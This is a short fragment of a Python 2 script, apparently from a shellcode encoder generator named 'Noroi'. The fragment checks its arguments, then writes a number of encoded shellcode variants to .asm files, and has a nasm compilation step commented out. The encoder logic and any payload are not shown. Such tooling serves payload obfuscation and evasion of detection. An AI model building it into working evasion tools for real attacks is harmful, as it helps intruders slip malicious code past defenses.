    if shellCount == 0 or shellcodeFile == "" :
        print "Error : Missing arguments, try -h argument"
        sys.exit()

    for i in xrange(0, shellCount):
        fileName = "Noroi_"+ str(i)+ "_.asm"
        file = open(fileName, "w")
        file.write(genNewShellcodeEncoder(shellcodeFile))
        #print "["+ str(i) +"] Shellcode Generated, waiting for compilation to finish..."
        #nasmProc = subprocess.Popen("nasm.exe -f bin " + fileName)
        #nasmProc.wait()
        file.close()

if __name__ == "__main__":
    main(sys.argv[1:])